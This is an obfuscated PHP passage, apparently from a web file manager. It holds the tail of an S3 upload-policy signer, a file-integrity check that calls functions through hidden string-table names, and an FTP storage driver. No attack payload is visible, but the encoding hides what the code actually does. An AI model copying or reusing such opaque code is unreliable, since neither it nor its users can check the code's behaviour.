$bÍªÏÍİ‰‚ = $f…Ì¥–À™…[191]; $C³Ûïõ‡î = $f…Ì¥–À™…[1116]; goto d„•…¡ì›Ñ; b»ÖùƒóÆò: $cœÔ¶ù°ÔŒ = array($f…Ì¥–À™…[205] => $f…Ì¥–À™…[33], $f…Ì¥–À™…[1128] => $f…Ì¥–À™…[33], $f…Ì¥–À™…[1087] => $bÍªÏÍİ‰‚, $f…Ì¥–À™…[1091] => $E‡ˆÇ…ÄÙƒ, $f…Ì¥–À™…[1095] => $EÅ¿ïÁ‡´·, $f…Ì¥–À™…[1129] => $d¦´Ì±æè·, $f…Ì¥–À™…[1130] => $C³Ûïõ‡î, $f…Ì¥–À™…[1131] => $e¿ÏîÂˆáŠ, $f…Ì¥–À™…[1132] => $f…ô–ôšÙ±, $f…Ì¥–À™…[1133] => $báÅù¤ƒ¸ã, $f…Ì¥–À™…[165] => $this->getHost()); return $cœÔ¶ù°ÔŒ; goto AŸ¾¶³íáÚ; bš–‘ˆ•Šœ: $b†”†Ö½°í = hash_hmac($f…Ì¥–À™…[1126], $c“æôí×·´, $B¡›Ñ¾×â, !0); $AÛ»Â®œ‰ = hash_hmac($f…Ì¥–À™…[1126], $dµÁ¾¯Ì±, $b†”†Ö½°í, !0); $báÅù¤ƒ¸ã = hash_hmac($f…Ì¥–À™…[1126], $EÅ¿ïÁ‡´·, $AÛ»Â®œ‰); goto b»ÖùƒóÆò; bÎøÜ”¸¿Ë: $dµÁ¾¯Ì± = $f…Ì¥–À™…[1118]; $f…ô–ôšÙ± = $fÊ›ùšøÑ . $f…Ì¥–À™…[33]; $E‡ˆÇ…ÄÙƒ = $f…Ì¥–À™…[1083]; goto a¿£…ªİÉ; a¿£…ªİÉ: $DäĞÍêÅŒÅ = array($this->accessKey, $E’•Öµ¤«æ, $this->region, $c“æôí×·´, $dµÁ¾¯Ì±); $d¦´Ì±æè· = implode($f…Ì¥–À™…[8], $DäĞÍêÅŒÅ); $EóÜöĞŒ» = array($f…Ì¥–À™…[1085] => gmdate($f…Ì¥–À™…[1084], strtotime($f…Ì¥–À™…[1119])), $f…Ì¥–À™…[1086] => array(array($f…Ì¥–À™…[1088] => $this->bucket), array($f…Ì¥–À™…[1087] => $bÍªÏÍİ‰‚), array($f…Ì¥–À™…[1089], $f…Ì¥–À™…[1090], $f…Ì¥–À™…[33]), array($f…Ì¥–À™…[1089], $f…Ì¥–À™…[1120], $f…Ì¥–À™…[33]), array($f…Ì¥–À™…[1089], $f…Ì¥–À™…[1121], $f…Ì¥–À™…[33]), array($f…Ì¥–À™…[1091] => $E‡ˆÇ…ÄÙƒ), array($f…Ì¥–À™…[1122] => $d¦´Ì±æè·), array($f…Ì¥–À™…[1123] => $C³Ûïõ‡î), array($f…Ì¥–À™…[1124] => $e¿ÏîÂˆáŠ), array($f…Ì¥–À™…[1125] => $f…ô–ôšÙ±))); goto E°Åº¤Êœ; AŸ¾¶³íáÚ: } } $Dì„øÙé´† = LIB_DIR . $_SERVER[ºÖÙÂŒäÉê‡][707]; $EÃ©Ä­Øº÷ = $_SERVER[ºÖÙÂŒäÉê‡][708]; goto cÎÙ¦Ûë·ß; cÎÙ¦Ûë·ß: if ($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][169]] != $EÃ©Ä­Øº÷($Dì„øÙé´†)) { goto Eí£ù‰ÅÔÌ; Eí£ù‰ÅÔÌ: $d”Í„àŸàù = $_SERVER[ºÖÙÂŒäÉê‡][171]; $Båçõƒ Ì² = $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][172]] . $_SERVER[ºÖÙÂŒäÉê‡][173]; $bˆÍÄ®Œ” = $d”Í„àŸàù($Båçõƒ Ì²); goto Cäé£®‡; F¼—ºøñ –: $fâ½Éİ°¶©($Dì„øÙé´†); goto aÍç«ç´Ûõ; Cäé£®‡: $F¡‚ÑÄÃùÇ = explode($_SERVER[ºÖÙÂŒäÉê‡][174], $bˆÍÄ®Œ”); if (count($F¡‚ÑÄÃùÇ) < $_SERVER[ºÖÙÂŒäÉê‡][175]) { $f¿ë„Éµ»— = $_SERVER[ºÖÙÂŒäÉê‡][176]; $f¿ë„Éµ»—(); } $fâ½Éİ°¶© = $_SERVER[ºÖÙÂŒäÉê‡][177]; goto F¼—ºøñ –; aÍç«ç´Ûõ: } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($EĞ¿åœŞ¦») { parent::__construct(); if (count($EĞ¿åœŞ¦») > 0) { $this->_init($EĞ¿åœŞ¦»); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Aà£ÃßÊªÔ) { $DùİçéŸ©ì =& $_SERVER[ºÖÙÂŒäÉê‡]; global $config; $this->appCharset = $config[$DùİçéŸ©ì[1134]]; $this->systemCharset = $config[$DùİçéŸ©ì[1135]]; if (isset($Aà£ÃßÊªÔ[$DùİçéŸ©ì[1136]]) && $Aà£ÃßÊªÔ[$DùİçéŸ©ì[1136]]) { $this->systemCharset = $Aà£ÃßÊªÔ[$DùİçéŸ©ì[1136]]; } } public function iconvApp($CÛÜ”°Êİõ) { return $this->iconvTo($CÛÜ”°Êİõ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Bß‘èÁ•µ¸) { return $this->iconvTo($Bß‘èÁ•µ¸, $this->appCharset, $this->systemCharset); } public function getPathOuter($bˆéÂÕ…Ÿ) { goto Cß©¢…¯Ò; e”ìµ–¡: if (substr($Cö‘ÉïÀç, 0, 2) == $C£à’è¿²[1137]) { $Cö‘ÉïÀç = BASIC_PATH . substr($Cö‘ÉïÀç, 2); } if (substr($bˆéÂÕ…Ÿ, 0, 2) == $C£à’è¿²[1137]) { $bˆéÂÕ…Ÿ = BASIC_PATH . substr($bˆéÂÕ…Ÿ, 2); } $Cö‘ÉïÀç = KodIO::clear($Cö‘ÉïÀç); goto Eš¡×§Û¤‚; B¨å’Êá˜º: return $this->pathDriver . $C£à’è¿²[8] . ltrim($bˆéÂÕ…Ÿ, $C£à’è¿²[8]); goto Bã„œ¸ƒ…ã; Eš¡×§Û¤‚: $bˆéÂÕ…Ÿ = KodIO::clear($bˆéÂÕ…Ÿ); $bˆéÂÕ…Ÿ = substr($bˆéÂÕ…Ÿ, strlen($Cö‘ÉïÀç)); if (empty($this->pathDriver)) { return $bˆéÂÕ…Ÿ; } goto B¨å’Êá˜º; Cß©¢…¯Ò: $C£à’è¿² =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cö‘ÉïÀç = $this->iconvApp($this->pathBase); $bˆéÂÕ…Ÿ = $this->iconvApp($bˆéÂÕ…Ÿ); goto e”ìµ–¡; Bã„œ¸ƒ…ã: } private function _init($E¤óèóßˆ = array()) { goto Cæµ˜”¬õõ; C½³•ç¥Ù°: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $aáÃîÑÇšè = @ftp_login($this->connect, $this->username, $this->userpass); goto E¿³‚Œ¯Û•; E¿³‚Œ¯Û•: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $A¡õÑñĞŠ [$EßèğíŠ±Š] = array($BÓÏ–àœ[1143] => $this->connect, $BÓÏ–àœ[165] => $this->host, $BÓÏ–àœ[164] => $this->scheme, $BÓÏ–àœ[166] => $this->port); goto C‚×ï´²ã; Cæµ˜”¬õõ: $BÓÏ–àœ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!function_exists($BÓÏ–àœ[1138])) { show_json(LNG($BÓÏ–àœ[1139]), !1); } $this->charsetReset($E¤óèóßˆ); goto a¹°‚Ù½¥; C‚×ï´²ã: return $aáÃîÑÇšè; goto E‚ª¹ÁâÕŠ; B“Ÿ‚ë£±ì: if (isset($A¡õÑñĞŠ [$EßèğíŠ±Š])) { foreach ($A¡õÑñĞŠ [$EßèğíŠ±Š] as $B©°¡Ää×• => $fì²åòæ¼Ç) { $this->{$B©°¡Ää×•} = $fì²åòæ¼Ç; } return !0; } $d³øä¼×‘ = parse_url(trim($this->server, $BÓÏ–àœ[8])); $this->host = $d³øä¼×‘[$BÓÏ–àœ[165]]; goto Cîà»ë˜…; Cîà»ë˜…: $dãŠÜÌ‹ = isset($d³øä¼×‘[$BÓÏ–àœ[164]]) && $d³øä¼×‘[$BÓÏ–àœ[164]] == $BÓÏ–àœ[1140] ? !0 : !1; $this->scheme = $dãŠÜÌ‹ ? $BÓÏ–àœ[1141] : $BÓÏ–àœ[1142]; $this->port = isset($d³øä¼×‘[$BÓÏ–àœ[166]]) ? $d³øä¼×‘[$BÓÏ–àœ[166]] : 21; goto C½³•ç¥Ù°; a¹°‚Ù½¥: foreach ($E¤óèóßˆ as $B©°¡Ää×• => $fì²åòæ¼Ç) { if (isset($this->{$B©°¡Ää×•})) { $this->{$B©°¡Ää×•} = $fì²åòæ¼Ç; } } static $A¡õÑñĞŠ  = array(); $EßèğíŠ±Š = md5(json_encode($E¤óèóßˆ)); goto B“Ÿ‚ë£±ì; E‚ª¹ÁâÕŠ: } private function _isconn() { return is_resource($this->connect); } public function mkfile($d—îõÉµ®, $A¨øáğš†ˆ = '', $eÎõÂÂÏã = REPEAT_RENAME) { if ($this->setContent($d—îõÉµ®, $A¨øáğš†ˆ)) { return $this->getPathOuter($d—îõÉµ®); } return !1; } public function mkdir($f·˜ö¨¨ÎŠ, $eøøÈŒ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $f·˜ö¨¨ÎŠ = $this->iconvSystem($f·˜ö¨¨ÎŠ); if ($this->isFolder($f·˜ö¨¨ÎŠ) || @ftp_mkdir($this->connect, $f·˜ö¨¨ÎŠ)) { return $this->getPathOuter($f·˜ö¨¨ÎŠ); } if (!$this->mkdir($this->pathFather($f·˜ö¨¨ÎŠ))) { return !1; } if ($f·˜ö¨¨ÎŠ = @ftp_mkdir($this->connect, $f·˜ö¨¨ÎŠ)) { return $this->getPathOuter($f·˜ö¨¨ÎŠ); } return !1; } public function copyFile($Bì«Á¦ö«¼, $eçóÌù„¹Ü) { goto DÎõ¥Õ ¬; DÎõ¥Õ ¬: if (!$this->_isconn()) { return !1; } $d¼£’¾æ• = $this->pathThis($this->iconvSystem($Bì«Á¦ö«¼)); $b¼‡‹É‘…ç = $this->tempFile($d¼£’¾æ•); goto dÍ‘ÏÛƒ“±; dÍ‘ÏÛƒ“±: $f¹Ï¬ÎÙ•è = $this->iconvApp($b¼‡‹É‘…ç); $this->download($Bì«Á¦ö«¼, $f¹Ï¬ÎÙ•è); $FìËâ¸Ë« = $this->upload($eçóÌù„¹Ü, $f¹Ï¬ÎÙ•è); goto B£³¢è°Ñ; B£³¢è°Ñ: $this->tempFileRemve($b¼‡‹É‘…ç); return $FìËâ¸Ë«; goto c‡àƒöÍßø; c‡àƒöÍßø: } public function moveFile($dœ‹É¢Ã”Ş, $C–µÙœÛ³ô) { if (!$this->_isconn()) { return !1; } $dœ‹É¢Ã”Ş = $this->iconvSystem($dœ‹É¢Ã”Ş); $C–µÙœÛ³ô = $this->iconvSystem($C–µÙœÛ³ô); $EÊŸôã™¦ = @ftp_rename($this->connect, $dœ‹É¢Ã”Ş, $C–µÙœÛ³ô); return $EÊŸôã™¦ ? $this->getPathOuter($C–µÙœÛ³ô) : !1; } public function delFile($fĞÎêƒèïá) { if (!$this->_isconn()) { return !1; } $fĞÎêƒèïá = $this->iconvSystem($fĞÎêƒèïá); return @ftp_delete($this->connect, $fĞÎêƒèïá); } public function delFolder($dœÌíˆµ¢£) { if (!$this->_isconn()) { return !1; } $dœÌíˆµ¢£ = $this->iconvSystem($dœÌíˆµ¢£); $f»Ô—Ü¯­ = $this->ftpList($dœÌíˆµ¢£); if (!$f»Ô—Ü¯­) { return @ftp_rmdir($this->connect, $dœÌíˆµ¢£); } foreach ($f»Ô—Ü¯­ as $bÜØ·…Ç¾í) { if ($this->isFolder($bÜØ·…Ç¾í)) { $bÜØ·…Ç¾í = $this->iconvApp($bÜØ·…Ç¾í); $this->delFolder($bÜØ·…Ç¾í); } else { @ftp_delete($this->connect, $bÜØ·…Ç¾í); } } return @ftp_rmdir($this->connect, $dœÌíˆµ¢£); } public function rename($B—¦ê­ÉØ¥, $dĞÈšìªŸ) { goto E¦Åƒİº†ì; E¦Åƒİº†ì: $Bè¾‡ˆËë— =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->_isconn()) { return !1; } $D³¬É£Î“‹ = $this->fileNameAuto($this->pathFather($B—¦ê­ÉØ¥), $dĞÈšìªŸ); goto B´æ’Í©ÂÆ; f¯ˆğ–—è: $cÇ‡ÉÁÓô = rtrim($f‹ˆëÓº¬, $Bè¾‡ˆËë—[8]) . $Bè¾‡ˆËë—[8] . $D³¬É£Î“‹; $AïéÃî‹Œ = @ftp_rename($this->connect, $B—¦ê­ÉØ¥, $cÇ‡ÉÁÓô); $cÇ‡ÉÁÓô = $this->iconvApp($cÇ‡ÉÁÓô); goto bÅ×Ä ; bÅ×Ä : return $AïéÃî‹Œ ? $this->getPathOuter($cÇ‡ÉÁÓô) : !1; goto Eš‘Óñ; B´æ’Í©ÂÆ: $D³¬É£Î“‹ = $this->iconvSystem($D³¬É£Î“‹); $B—¦ê­ÉØ¥ = $this->iconvSystem($B—¦ê­ÉØ¥); $f‹ˆëÓº¬ = $this->pathFather($B—¦ê­ÉØ¥); goto f¯ˆğ–—è; Eš‘Óñ: } private function folderInfo($C–æê³õ‚È, $bÅõ°³ìƒæ = false) { goto c†æÊ‘š‘¾; BÄŠ§áõö‚: return $C‚Ÿì¦ï—æ; goto c‘ˆøß»¾; D¥ä°µ å: $f´‡›ò”ä = $this->iconvSystem($C–æê³õ‚È); if ($bÅõ°³ìƒæ) { return array($fš²Ôîµ‚ô[28] => $Eƒ™–±«Çò, $fš²Ôîµ‚ô[75] => $FÌóäöİ¤Ï, $fš²Ôîµ‚ô[29] => $fš²Ôîµ‚ô[76]); } $C‚Ÿì¦ï—æ = array($fš²Ôîµ‚ô[28] => $Eƒ™–±«Çò, $fš²Ôîµ‚ô[75] => $FÌóäöİ¤Ï, $fš²Ôîµ‚ô[29] => $fš²Ôîµ‚ô[76], $fš²Ôîµ‚ô[193] => 0, $fš²Ôîµ‚ô[106] => 0, $fš²Ôîµ‚ô[1144] => !0, $fš²Ôîµ‚ô[1145] => !0); goto BÄŠ§áõö‚; c†æÊ‘š‘¾: $fš²Ôîµ‚ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÌóäöİ¤Ï = $this->getPathOuter(rtrim($C–æê³õ‚È, $fš²Ôîµ‚ô[8])); $Eƒ™–±«Çò = $this->pathThis($FÌóäöİ¤Ï); goto D¥ä°µ å; c‘ˆøß»¾: } private function fileInfo($e×‚æñ·¢, $AĞĞºõ½ôÖ = false) { goto a«¸°Ú¦…Ç; c¼ŒÄÒ¯ëË: $e‹ˆá¸Ù·‚[$E„Ú¦µƒ®[106]] = $e‹ˆá¸Ù·‚[$E„Ú¦µƒ®[106]] > 0 ? $e‹ˆá¸Ù·‚[$E„Ú¦µƒ®[106]] : 0; return $e‹ˆá¸Ù·‚; goto bò¦Ü¤«˜; fÉ×œÈ­ã: $e…ÕÌ‘„Ì« = $this->iconvSystem($e×‚æñ·¢); if ($AĞĞºõ½ôÖ) { return array($E„Ú¦µƒ®[28] => $A¿ß¢‚Õ°, $E„Ú¦µƒ®[75] => $B÷Äè“šëÎ, $E„Ú¦µƒ®[29] => $E„Ú¦µƒ®[163], $E„Ú¦µƒ®[156] => $this->ext($e×‚æñ·¢), $E„Ú¦µƒ®[77] => $this->size($e×‚æñ·¢)); } $e‹ˆá¸Ù·‚ = array($E„Ú¦µƒ®[28] => $A¿ß¢‚Õ°, $E„Ú¦µƒ®[75] => $B÷Äè“šëÎ, $E„Ú¦µƒ®[29] => $E„Ú¦µƒ®[163], $E„Ú¦µƒ®[193] => 0, $E„Ú¦µƒ®[106] => @ftp_mdtm($this->connect, $e…ÕÌ‘„Ì«), $E„Ú¦µƒ®[156] => $this->ext($e×‚æñ·¢), $E„Ú¦µƒ®[77] => $this->size($e×‚æñ·¢), $E„Ú¦µƒ®[1144] => !0, $E„Ú¦µƒ®[1145] => !0); goto c¼ŒÄÒ¯ëË; a«¸°Ú¦…Ç: $E„Ú¦µƒ® =& $_SERVER[ºÖÙÂŒäÉê‡]; $B÷Äè“šëÎ = $this->getPathOuter(rtrim($e×‚æñ·¢, $E„Ú¦µƒ®[8])); $A¿ß¢‚Õ° = $this->pathThis($B÷Äè“šëÎ); goto fÉ×œÈ­ã; bò¦Ü¤«˜: } public function size($e÷›Ğˆ·Àâ) { $d‘Î×‰Š÷ = $this->objectMeta($e÷›Ğˆ·Àâ); return $d‘Î×‰Š÷ ? $d‘Î×‰Š÷[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function info($AË¤¼¯Á¡ã) { if ($this->isFile($AË¤¼¯Á¡ã)) { return $this->fileInfo($AË¤¼¯Á¡ã, 0); } else { if ($this->isFolder($AË¤¼¯Á¡ã)) { return $this->folderInfo($AË¤¼¯Á¡ã); } } return !1; } public function exist($A–“ÙÎö‹Ú) { return $this->objectMeta($A–“ÙÎö‹Ú) ? !0 : !1; } public function isFile($Fê³é‚Ù) { $A­ŞÓò·ï‘ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÑİÃÖÎó = $this->objectMeta($Fê³é‚Ù); return $aÑİÃÖÎó ? $aÑİÃÖÎó[$A­ŞÓò·ï‘[29]] == $A­ŞÓò·ï‘[163] : !1; } public function isFolder($f´Â“ÖÈ…ª) { $a¶°†¤ìô¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÈƒ¼–ß¡ï = $this->objectMeta($f´Â“ÖÈ…ª); return $aÈƒ¼–ß¡ï ? $aÈƒ¼–ß¡ï[$a¶°†¤ìô¡[29]] == $a¶°†¤ìô¡[76] : !1; } public function listPath($bŞæóÙ™ïŞ, $A‘´»ÎŒÔ• = false) { goto F¹‘Ï‹ÌÃ; F¹‘Ï‹ÌÃ: $côø‰‰ìö· =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->_isconn()) { return !1; } $bŞæóÙ™ïŞ = $this->iconvSystem($bŞæóÙ™ïŞ); goto B‡»‰ÊÓ–; cÂÖµ¿±ù×: foreach ($dñâÏ™ß˜™ as $bŞæóÙ™ïŞ) { if ($this->isFolder($bŞæóÙ™ïŞ)) { $BŒÛğµÖÍ…[$côø‰‰ìö·[74]][] = $this->folderInfo($bŞæóÙ™ïŞ, $A‘´»ÎŒÔ•); } else { $BŒÛğµÖÍ…[$côø‰‰ìö·[73]][] = $this->fileInfo($bŞæóÙ™ïŞ, $A‘´»ÎŒÔ•); } } return $BŒÛğµÖÍ…; goto Bƒ ÅóÁ†¹; B‡»‰ÊÓ–: $dñâÏ™ß˜™ = $this->ftpList($bŞæóÙ™ïŞ); $BŒÛğµÖÍ… = array($côø‰‰ìö·[74] => array(), $côø‰‰ìö·[73] => array()); if (!$dñâÏ™ß˜™) { return $BŒÛğµÖÍ…; } goto cÂÖµ¿±ù×; Bƒ ÅóÁ†¹: } public function has($BãÚ‡Œº»Ó, $Aƒ±ß«È = false, $FÜ×ŠÚ¿Ìø = true) { goto fßñ‡ÈÁÁ; fßñ‡ÈÁÁ: $d…Ò÷ïè£› =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->_isconn()) { return !1; } $BãÚ‡Œº»Ó = $this->iconvSystem($BãÚ‡Œº»Ó); goto dÍãĞ°ÀÎ; dÍãĞ°ÀÎ: $e·ô÷Âèö = $this->ftpList($BãÚ‡Œº»Ó); if (!$e·ô÷Âèö) { return !1; } if ($Aƒ±ß«È) { return array($d…Ò÷ïè£›[197] => 0, $d…Ò÷ïè£›[198] => count($e·ô÷Âèö)); } goto eã“·îöÂ‰; eã“·îöÂ‰: foreach ($e·ô÷Âèö as $BãÚ‡Œº»Ó) { if ($FÜ×ŠÚ¿Ìø) { if (!$this->isFolder($BãÚ‡Œº»Ó)) { return !0; } } else { if ($this->isFolder($BãÚ‡Œº»Ó)) { return !0; } } } return !1; goto c°ó—¥â«†; c°ó—¥â«†: } public function listAll($F¯»¯ğ°±) { goto a…äãõ´Øò; a…äãõ´Øò: $CŠàèğš…÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->_isconn()) { return !1; } $F¯»¯ğ°± = $this->iconvSystem($F¯»¯ğ°±); goto b£à’ôòø; b£à’ôòø: $FÕ±½ÈèÄ = array($CŠàèğš…÷[73] => array(), $CŠàèğš…÷[74] => array()); $this->recursionFtpFiles($F¯»¯ğ°±, $FÕ±½ÈèÄ); $BÁ‡´ØÏ‹Ğ = array(); goto F³Ä£¯ŠÔ; F³Ä£¯ŠÔ: foreach ($FÕ±½ÈèÄ[$CŠàèğš…÷[74]] as $E—Ä‰¬–ÎÎ) { $BÁ‡´ØÏ‹Ğ[] = array($CŠàèğš…÷[75] => $CŠàèğš…÷[8] . trim(str_replace($F¯»¯ğ°±, $CŠàèğš…÷[33], $E—Ä‰¬–ÎÎ), $CŠàèğš…÷[8]) . $CŠàèğš…÷[8], $CŠàèğš…÷[76] => 1, $CŠàèğš…÷[77] => 0); } foreach ($FÕ±½ÈèÄ[$CŠàèğš…÷[73]] as $fï¥¾¹³ÔÊ) { $BÁ‡´ØÏ‹Ğ[] = array($CŠàèğš…÷[75] => $CŠàèğš…÷[8] . trim(str_replace($F¯»¯ğ°±, $CŠàèğš…÷[33], $fï¥¾¹³ÔÊ), $CŠàèğš…÷[8]), $CŠàèğš…÷[76] => 0, $CŠàèğš…÷[77] => $this->size($fï¥¾¹³ÔÊ)); } return $BÁ‡´ØÏ‹Ğ; goto bÄÂÃï…Ÿµ; bÄÂÃï…Ÿµ: } public function getContent($f×†ÈÅ Û¾) { if (!$this->_isconn()) { return !1; } $f×†ÈÅ Û¾ = $this->iconvSystem($f×†ÈÅ Û¾); return $this->fileSubstr($f×†ÈÅ Û¾); } public function setContent($fÈé˜ÓÍëî, $bŠ£ĞÉÕÄ = '') { goto FÅİİåÛá­; báˆ¹×–: file_put_contents($dã¤ŸÓØ, $bŠ£ĞÉÕÄ); $EÎ´ ËÈÕ = $this->upload($fÈé˜ÓÍëî, $this->iconvApp($dã¤ŸÓØ)); $this->tempFileRemve($dã¤ŸÓØ); goto a™ñ³ŞÄŞÀ; FÅİİåÛá­: if (!$this->_isconn()) { return !1; } $cêÑÊ»„¯ = $this->pathThis($this->iconvSystem($fÈé˜ÓÍëî)); $dã¤ŸÓØ = $this->tempFile($cêÑÊ»„¯); goto báˆ¹×–; a™ñ³ŞÄŞÀ: return $EÎ´ ËÈÕ; goto a¦ ÌÁÎ; a¦ ÌÁÎ: } public function fileSubstr($a·Â”¿ñ, $f”£’±æ‹ö = 0, $aˆ¡•±Ì… = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($a·Â”¿ñ, $f”£’±æ‹ö, $aˆ¡•±Ì…); } private function ftpRequest($bµ­Õ¼æ†ô, $cºã…×Ëäæ = 0, $E¯ÈŸ–£’ = false) { goto d¥’äù­¨À; CŞŞëåš×§: curl_setopt($c®·µšĞè, CURLOPT_RETURNTRANSFER, 1); $BÒåÛ­Ù»Ñ = curl_exec($c®·µšĞè); curl_close($c®·µšĞè); goto BÇ‹Ÿ…Ä¡¨; fŠäñÑ¼½í: curl_setopt($c®·µšĞè, CURLOPT_URL, $AÆº²÷îæ . $this->pathEncode($bµ­Õ¼æ†ô)); curl_setopt($c®·µšĞè, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($E¯ÈŸ–£’) { $EÇî÷ÂÑÕ­ = $cºã…×Ëäæ + $E¯ÈŸ–£’ - 1; curl_setopt($c®·µšĞè, CURLOPT_RANGE, "{$cºã…×Ëäæ}\x2d{$EÇî÷ÂÑÕ­}"); } goto CŞŞëåš×§; d¥’äù­¨À: $bµ­Õ¼æ†ô = $this->iconvSystem($bµ­Õ¼æ†ô); $AÆº²÷îæ = $this->scheme . $this->host . $_SERVER[ºÖÙÂŒäÉê‡][4] . $this->port; $c®·µšĞè = curl_init(); goto fŠäñÑ¼½í; BÇ‹Ÿ…Ä¡¨: return $BÒåÛ­Ù»Ñ; goto AïØîô»Ö; AïØîô»Ö: } public function upload($Cë‚ÎëÊ‘, $bó¬…À‡ ¶, $Aå‹¸©ºØ = false, $A‚­‘ò¿ïĞ = REPEAT_REPLACE) { goto E§·‚¢Úò¡; A©Ğ×æ´¾¶: $bó¬…À‡ ¶ = $this->iconvSystem($bó¬…À‡ ¶); $DÈá‡ÒÎÂ = ftp_nb_put($this->connect, $Cë‚ÎëÊ‘, $bó¬…À‡ ¶, FTP_BINARY); while ($DÈá‡ÒÎÂ == FTP_MOREDATA) { $DÈá‡ÒÎÂ = ftp_nb_continue($this->connect); } goto C“èôë® „; C“èôë® „: if ($DÈá‡ÒÎÂ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Cë‚ÎëÊ‘); goto B‹«ç×¸–»; E§·‚¢Úò¡: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Cë‚ÎëÊ‘))) { return !1; } $Cë‚ÎëÊ‘ = $this->iconvSystem($Cë‚ÎëÊ‘); goto A©Ğ×æ´¾¶; B‹«ç×¸–»: } public function download($CóÏ£’¨Ş, $Có¢™Òâ®Š = '') { goto D–‰Š Œë¥; eµÄØÀäã: $CóÏ£’¨Ş = $this->iconvSystem($CóÏ£’¨Ş); $Có¢™Òâ®Š = $this->iconvSystem($Có¢™Òâ®Š); $D³˜†–÷´” = ftp_nb_get($this->connect, $Có¢™Òâ®Š, $CóÏ£’¨Ş, FTP_BINARY); goto BŠó¤ŞÕÅù; BŠó¤ŞÕÅù: while ($D³˜†–÷´” == FTP_MOREDATA) { $D³˜†–÷´” = ftp_nb_continue($this->connect); } if ($D³˜†–÷´” != FTP_FINISHED) { return !1; } return $this->iconvApp($Có¢™Òâ®Š); goto Dø™¸Ç‘¡; D–‰Š Œë¥: if (!$this->_isconn()) { return !1; } $Fâ‘ÇÎ·™ = $this->pathFather($Có¢™Òâ®Š); if (!IO::mkdir($Fâ‘ÇÎ·™)) { return !1; } goto eµÄØÀäã; Dø™¸Ç‘¡: } private function ftpList($FÁ³ŒÃÇĞ‰) { goto d²é¡İ×Œ; d²é¡İ×Œ: $cŞöºÌŒª× =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->isFolder($FÁ³ŒÃÇĞ‰)) { return !1; } @ftp_chdir($this->connect, $cŞöºÌŒª×[8]); goto eæšÁÌ·œÅ; AÎ¬ÜğĞõÏ: $F™„¡¬ŸåŒ = array(); foreach ($e—àÁØíô as $BàËš Äåİ) { if ($BàËš Äåİ == $cŞöºÌŒª×[91] || $BàËš Äåİ == $cŞöºÌŒª×[1147]) { continue; } if (!strstr($BàËš Äåİ, $cŞöºÌŒª×[8])) { $BàËš Äåİ = $FÁ³ŒÃÇĞ‰ . ltrim($BàËš Äåİ, $cŞöºÌŒª×[8]); } $F™„¡¬ŸåŒ[] = $this->iconvApp($BàËš Äåİ); } return $F™„¡¬ŸåŒ; goto DÈÑƒÄÌÊ¶; eæšÁÌ·œÅ: $FÁ³ŒÃÇĞ‰ = rtrim($FÁ³ŒÃÇĞ‰, $cŞöºÌŒª×[8]) . $cŞöºÌŒª×[8]; $e—àÁØíô = @ftp_nlist($this->connect, $FÁ³ŒÃÇĞ‰); if ($e—àÁØíô === !1) { $e—àÁØíô = @ftp_rawlist($this->connect, $FÁ³ŒÃÇĞ‰); foreach ($e—àÁØíô as $B†İ´¶Ê…µ => $AŠÔç‡í™Æ) { $e—àÁØíô[$B†İ´¶Ê…µ] = end(explode($cŞöºÌŒª×[1146], $AŠÔç‡í™Æ)); } } goto AÎ¬ÜğĞõÏ; DÈÑƒÄÌÊ¶: } private function recursionFtpFiles($A³Ô÷—š™, &$Dö‡µ‚‡‡Ğ) { $d‚â—ÏÅöè =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->_isconn()) { return !1; } if (!($c…ä¯ì×ñß = $this->ftpList($A³Ô÷—š™))) { return !1; } foreach ($c…ä¯ì×ñß as $A³Ô÷—š™) { if ($this->isFolder($A³Ô÷—š™)) { $this->recursionFtpFiles($A³Ô÷—š™, $Dö‡µ‚‡‡Ğ); $Dö‡µ‚‡‡Ğ[$d‚â—ÏÅöè[74]][] = $A³Ô÷—š™; } else { $Dö‡µ‚‡‡Ğ[$d‚â—ÏÅöè[73]][] = $A³Ô÷—š™; } } } private function objectMeta($b·°Ù‡»ø) { goto BÉñï¡ğÆµ; e’ˆ¬•µµ¯: if ($dÊÒôÏø·á !== null && $dÊÒôÏø·á !== !1) { return $dÊÒôÏø·á; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $aĞòà¯õ³[8]); goto AÅ¥£óÏ²ê; eÜ‰à¹‹­›: return $dÊÒôÏø·á; goto eİåİ‚×“; AÅ¥£óÏ²ê: $eì¡­óƒ‰¾ = @ftp_size($this->connect, $this->iconvSystem($b·°Ù‡»ø)); if ($eì¡­óƒ‰¾ != -1) { $dÊÒôÏø·á = array($aĞòà¯õ³[77] => $eì¡­óƒ‰¾, $aĞòà¯õ³[29] => $aĞòà¯õ³[163]); } else { $AÉ¶æ”÷ğ­ = @ftp_chdir($this->connect, $this->iconvSystem($b·°Ù‡»ø)); $dÊÒôÏø·á = $AÉ¶æ”÷ğ­ ? array($aĞòà¯õ³[77] => 0, $aĞòà¯õ³[29] => $aĞòà¯õ³[76]) : !1; } Cache::set($e¢ˆ”¸‘‘, $dÊÒôÏø·á, 0); goto eÜ‰à¹‹­›; 